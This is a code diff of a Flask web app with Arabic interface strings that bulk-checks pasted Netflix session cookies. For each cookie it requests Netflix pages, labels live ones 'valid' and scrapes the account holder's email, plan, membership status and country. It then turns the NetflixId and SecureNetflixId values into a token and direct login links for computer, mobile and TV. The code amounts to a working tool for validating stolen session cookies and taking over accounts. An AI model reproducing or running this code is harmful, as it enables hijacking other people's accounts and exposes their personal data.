-                    'membership': mm.group(1) if mm else 'غير معروف',
-                    'plan': pm.group(1) if pm else 'غير معروف',
-                    'country': cm.group(1) if cm else 'غير معروف',
-                    'email': em.group(1) if em else 'غير معروف'
-                }
-                nid = sid = None
-                for p in cookie.split(';'):
-                    p = p.strip()
-                    if p.startswith('NetflixId='): nid = p.split('=',1)[1]
-                    elif p.startswith('SecureNetflixId='): sid = p.split('=',1)[1]
-                if nid and sid:
-                    payload = {'netflixId':nid,'secureNetflixId':sid,'timestamp':datetime.now().isoformat()}
-                    token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
-                    result['api_tokens'] = {
-                        'api_token': token,
-                        'direct_links': {
-                            'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
-                            'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
-                            'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
-                        }
+
+        text = r2.text
+        # تحقق من وجود بيانات العضوية
+        if 'membershipStatus' in text or 'profiles' in text or 'gps' in text:
+            result['status'] = 'valid'
+            result['message'] = '✅ كوكيز صالحة'
+            # استخراج البيانات من JSON المضمن
+            try:
+                data_match = re.search(r'window\.__netflix\.reactContext\s*=\s*({.*?});', text, re.DOTALL)
+                if data_match:
+                    data = json.loads(data_match.group(1))
+                    # تنقل في المسار: models -> userInfo -> ...
+                    user_info = data.get('models',{}).get('userInfo',{}).get('data',{})
+                    if not user_info:
+                        # مسار بديل
+                        user_info = data.get('models',{}).get('serverModel',{}).get('data',{}).get('userInfo',{})
+                    result['details'] = {
+                        'email': user_info.get('email',''),
+                        'membership': user_info.get('membershipStatus',''),
+                        'plan': user_info.get('plan',{}).get('planName',''),
+                        'country': user_info.get('countryOfSignup','')
                     }
-            else:
-                result['status'] = 'valid'
-                result['message'] = '✅ كوكيز صالحة (بدون بيانات)'
+                else:
+                    # محاولة regex بسيطة
+                    em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
+                    mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
+                    result['details'] = {
+                        'email': em.group(1) if em else '',
+                        'membership': mm.group(1) if mm else '',
+                    }
+            except:
+                pass
+
+            # إنشاء ApiToken
+            nid = re.search(r'NetflixId=([^;]+)', cookie)
+            sid = re.search(r'SecureNetflixId=([^;]+)', cookie)
+            if nid and sid:
+                payload = {'netflixId':nid.group(1),'secureNetflixId':sid.group(1),'timestamp':datetime.now().isoformat()}
+                token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
+                result['api_tokens'] = {
+                    'api_token': token,
+                    'direct_links': {
+                        'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
+                        'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
+                        'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
+                    }
+                }
         else:
             result['status'] = 'error'
-            result['message'] = f'⚠️ خطأ {r.status_code}'
+            result['message'] = '⚠️ لا يمكن التحقق (ربما حظر)'
         return result
     except Exception as e:
-        return {'status':'error','message':str(e),'cookie':cookie,'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+        return {'status':'error','message':str(e),'cookie':cookie}
 
 @app.route('/')
 def home():
     return render_template_string(HTML)
 
-@app.route('/check_multiple', methods=['POST'])
-def check_multiple():
+@app.route('/check', methods=['POST'])
+def check():
     data = request.get_json()
     cookies = data.get('cookies','')
     if not cookies: return jsonify([])
     lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
     results = []
-    with ThreadPoolExecutor(max_workers=5) as ex:
+    with ThreadPoolExecutor(max_workers=4) as ex:
         futs = {ex.submit(check_cookie, c):i for i,c in enumerate(lines,1)}
         for f in as_completed(futs):
             try:
